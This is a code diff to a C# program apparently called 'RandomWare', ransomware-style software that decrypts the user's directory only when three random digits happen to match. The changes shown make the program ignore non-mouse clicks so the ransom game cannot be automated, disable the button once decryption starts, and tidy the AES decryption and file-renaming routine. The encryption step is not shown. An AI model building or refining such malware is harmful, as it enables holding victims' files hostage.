@@ -44,12 +44,16 @@ namespace RandomWare
 
         private void button1_Click(object sender, EventArgs e)
         {
+            bool IsMouse = (e is System.Windows.Forms.MouseEventArgs);
+            if (!IsMouse)
+                return;
             label2.Text =random.Next(1,10).ToString();
             label3.Text = random.Next(1, 10).ToString();
             label4.Text = random.Next(1, 10).ToString();
 
             if(label2.Text.Equals(label3.Text)&&label3.Text.Equals(label4.Text))
             {
+                button1.Enabled = false;
                 MessageBox.Show("세 숫자가 같습니다.\n복호화를 시작합니다.");
                 DecryptDirectory(key, userpath);
                 MessageBox.Show("복호화가 완료 되었습니다.\n프로그램을 종료합니다.");
@@ -114,10 +118,11 @@ namespace RandomWare
             byte[] bytesDecrypted = AES_Decrypt(bytesToBeDecrypted, passwordBytes);
 
             File.WriteAllBytes(file, bytesDecrypted);
-            string extension = System.IO.Path.GetExtension(file);
+            string extension = Path.GetExtension(file);
             string result = file.Substring(0, file.Length - extension.Length);
-            System.IO.File.Move(file, result);
+            File.Move(file, result);
 
         }
+        
     }
 }
